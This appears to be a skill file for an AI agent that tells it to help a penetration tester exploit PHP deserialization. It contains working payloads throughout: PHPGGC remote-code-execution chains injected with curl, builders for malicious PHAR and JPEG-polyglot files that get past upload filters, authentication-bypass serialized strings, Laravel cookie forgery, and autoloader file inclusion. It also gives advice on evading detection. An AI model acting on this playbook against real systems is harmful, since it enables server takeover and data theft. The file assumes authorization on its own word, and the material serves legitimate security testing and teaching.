---
name: deserialization-php
description: >
  Exploit PHP deserialization vulnerabilities during authorized penetration
  testing.
keywords:
  - php deserialization
  - php object injection
  - unserialize exploit
  - __wakeup exploit
  - __destruct exploit
  - phar deserialization
  - phar polyglot
  - PHPGGC
  - Laravel deserialization
  - PHP POP chain
  - php magic methods exploit
  - type juggling auth bypass
tools:
  - phpggc
  - burpsuite
  - exiftool
opsec: medium
---

# PHP Deserialization

You are helping a penetration tester exploit PHP deserialization
vulnerabilities. The target application passes untrusted data to
`unserialize()` or processes attacker-controlled phar:// streams, enabling
object injection and remote code execution via gadget chains. All testing is
under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[deserialization-php] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- A PHP deserialization endpoint (`unserialize()` on user input, or filesystem
  function accepting `phar://`)
- Tools: `phpggc` (`git clone https://github.com/ambionics/phpggc`),
  Burp Suite for request interception
- Knowledge of target framework/libraries (Laravel, Symfony, WordPress, etc.)

## Step 1: Assess

If not already provided, determine:

1. **Serialization format** — look for these patterns:

| Pattern | Meaning | Example |
|---------|---------|---------|
| `O:<len>:"<class>"` | Serialized object | `O:8:"stdClass":1:{s:1:"a";s:1:"b";}` |
| `a:<count>:{...}` | Serialized array | `a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}` |
| `s:<len>:"<value>"` | Serialized string | `s:5:"hello";` |
| `Tz` (base64) | Base64-encoded serialized | Decode to check for `O:` or `a:` |

2. **Entry point**:
   - GET/POST parameters
   - Cookies (session data, auth tokens)
   - HTTP headers
   - File uploads (phar:// trigger)
   - Database-stored serialized data

3. **Framework** — check for Laravel, Symfony, WordPress, Magento, CakePHP,
   Yii, CodeIgniter (determines available PHPGGC chains)

4. **PHP version** — PHP 7.0+ supports `allowed_classes` option in
   `unserialize()`, PHP 7.4+ has `__serialize()`/`__unserialize()`

Skip if context was already provided.

## Step 2: Basic Object Injection

### Direct Injection (Custom Application)

If the application has vulnerable classes with exploitable magic methods:

```php
# Magic methods triggered during deserialization:
# __wakeup()    — called when object is unserialized
# __destruct()  — called when object is garbage collected (most reliable)
# __toString()  — called when object is cast to string
# __call()      — called when undefined method is invoked
# __get()       — called when undefined property is read
```

**Test payload** — modify object properties:

```
# Original serialized session (example)
O:4:"User":2:{s:4:"name";s:5:"guest";s:5:"admin";b:0;}

# Modified — set admin=true
O:4:"User":2:{s:4:"name";s:5:"guest";s:5:"admin";b:1;}
```

### Type Juggling via Deserialization

Exploit loose comparison (`==`) in PHP:

```
# If auth check uses: if ($data['password'] == $storedPassword)
# Send boolean true — true == "any_string" is true in PHP
a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}

# Magic hash collision (md5/sha1 starting with 0e — treated as 0 in ==)
# md5('240610708') starts with 0e → 0e... == 0e... is true
```

### Private/Protected Property Injection

PHP serialization encodes visibility with null bytes:

```
# Public property
s:4:"name";s:5:"value";

# Protected property (prefix: \0*\0)
s:7:"\0*\0name";s:5:"value";

# Private property (prefix: \0ClassName\0)
s:14:"\0MyClass\0name";s:5:"value";
```

## Step 3: PHPGGC (Framework Gadget Chains)

PHPGGC generates POP chains for common PHP frameworks and libraries.

```bash
# List all available gadget chains
phpggc --list

# Common RCE chains
phpggc Monolog/RCE1 system id                    # Monolog logging
phpggc Monolog/RCE2 system id                    # Monolog alternative
phpggc Laravel/RCE9 system id                    # Laravel framework
phpggc Laravel/RCE13 system id                   # Laravel alternative
phpggc Symfony/RCE4 system id                    # Symfony framework
phpggc SwiftMailer/FW1 /var/www/html/shell.php /tmp/data  # File write

# Output formats
phpggc Monolog/RCE1 system id -s                 # Serialized string
phpggc Monolog/RCE1 system id -b                 # Base64 encoded
phpggc Monolog/RCE1 system id -u                 # URL encoded
phpggc Monolog/RCE1 system id -p phar -o /tmp/exploit.phar  # PHAR format

# Inject into parameter
curl -X POST https://TARGET/endpoint \
  -d "data=$(phpggc Monolog/RCE1 system 'id' -u)"
```

**Framework → chain selection:**

| Framework/Library | Chains | Notes |
|-------------------|--------|-------|
| Laravel | RCE9, RCE13, RCE15 | Requires APP_KEY for encrypted cookies |
| Symfony | RCE4+ | Common in Symfony-based apps |
| Monolog | RCE1, RCE2 | Widely used logging library |
| Guzzle | FW1, Info1 | HTTP client — file write chains |
| SwiftMailer | FW1-4 | Email library — file write |
| Doctrine | RCE1-2 | ORM — RCE chains |
| WordPress | Various | Plugin-dependent gadgets |
| CakePHP | RCE1 | Framework-specific |
| Yii | RCE1 | Framework-specific |

### Laravel with Known APP_KEY

If the Laravel APP_KEY is known (from `.env` disclosure, git leak, debug
page, etc.), encrypted cookies can be forged:

```bash
# Generate gadget chain
phpggc Laravel/RCE13 system 'id' -b -f

# Encrypt with laravel-crypto-killer
python3 laravel_crypto_killer.py encrypt \
  -k "base64:APP_KEY_HERE" \
  -v "$(phpggc Laravel/RCE13 system id -b -f)"

# Inject as Laravel session cookie or XSRF-TOKEN
```

**APP_KEY leak sources:** `.env` via path traversal, debug error pages
(`APP_DEBUG=true`), git repository exposure, backup files, phpinfo().

## Step 4: Phar Deserialization

When PHP filesystem functions process a `phar://` path, the PHAR metadata
is automatically deserialized — even with functions like `file_exists()`,
`filesize()`, `fopen()`, `is_file()`, `md5_file()`, `file_get_contents()`.

### Create Malicious PHAR

```php
<?php
// create_phar.php — run with: php --define phar.readonly=0 create_phar.php

class VULN_CLASS {  // Replace with target's vulnerable class
    public $cmd = 'system("id");';
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new VULN_CLASS());
$phar->stopBuffering();
?>
```

### PHAR Polyglot (Bypass Upload Filters)

Prepend image magic bytes to make the PHAR appear as a valid image:

```php
<?php
// JPEG polyglot — passes image validation, works as PHAR
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");  // JPEG header
$phar->setMetadata(new VULN_CLASS());
$phar->stopBuffering();
// Rename to .jpg for upload
rename('exploit.phar', 'exploit.jpg');
?>
```

Other magic byte options: `GIF89a` (GIF), `\x89PNG\r\n\x1a\n` (PNG).

### PHAR + PHPGGC

```bash
# Generate PHAR with framework gadget chain
phpggc Monolog/RCE1 system id -p phar -o exploit.phar

# Create JPEG polyglot PHAR with PHPGGC
phpggc Monolog/RCE1 system id -p phar -pp GIF -o exploit.gif
```

### Exploitation Flow

1. Upload PHAR polyglot as image (passes extension/MIME checks)
2. Trigger deserialization via any filesystem function that accepts
   user-controlled path:
   ```
   # If app has: file_exists($_GET['file'])
   curl "https://TARGET/check?file=phar:///var/www/uploads/exploit.jpg"

   # If app has: getimagesize($_GET['url'])
   curl "https://TARGET/resize?url=phar:///var/www/uploads/exploit.jpg"
   ```

## Step 5: Autoload Exploitation

When the target has `spl_autoload_register()` and you can deserialize
objects of non-existent classes, the autoloader attempts to load them —
potentially including arbitrary files.

```php
// If autoloader converts underscores to directory separators:
// spl_autoload_register(function($name) {
//     require '/' . str_replace('_', '/', $name) . '.php';
// });

// Payload to load /tmp/evil.php via autoloader:
O:8:"tmp_evil":0:{}

// Load another webapp's composer autoloader (gains access to its gadgets):
O:28:"www_frontend_vendor_autoload":0:{}
```

**Chain technique**: Load another app's autoloader via deserialization,
then exploit gadgets from that app's dependencies (e.g., Guzzle
FileCookieJar for file write).

## Step 6: Escalate or Pivot

## OPSEC Notes

- Serialized payloads visible in web server access logs
- PHAR files persist on disk — clean up after testing
- PHPGGC chains contain distinctive class names (Monolog, Guzzle) that may
  trigger application-level logging
- Failed deserialization attempts often generate PHP warnings/errors —
  check if error logging exposes testing activity
- Laravel encrypted cookies hide payload content but cookie size may be
  anomalous

## Troubleshooting

### PHPGGC Chain Throws Error

- Confirm the target framework/library version matches the chain requirements
- Try multiple chains for the same framework (`Laravel/RCE9`, `RCE13`, `RCE15`)
- Check if `unserialize()` uses `allowed_classes` restriction (PHP 7.0+)
- If `allowed_classes` is set, only whitelisted classes instantiate — try
  phar:// deserialization instead (bypasses `allowed_classes`)

### Phar Deserialization Not Triggering

- Verify the filesystem function accepts user-controlled input
- Check if `phar://` wrapper is disabled in `php.ini`
  (`allow_url_fopen` does not affect phar)
- Ensure the PHAR file is accessible at the path you're referencing
- Try `phar://` with relative and absolute paths
- Some functions require the phar to have a valid signature

### Serialized Data Modified but No Effect

- Check if the application validates a MAC/signature on the serialized data
- Laravel encrypts + HMACs cookies — need APP_KEY to forge
- WordPress uses `wp_salt()` for cookie signatures
- Try finding the signing key or look for unsigned deserialization points

### Type Juggling Bypass Not Working

- PHP 8.0+ changed `==` behavior for string-number comparison (`"0" == ""`
  is now false)
- Check if the application uses strict comparison (`===`)
- Magic hash collisions only work with loose `==` comparison
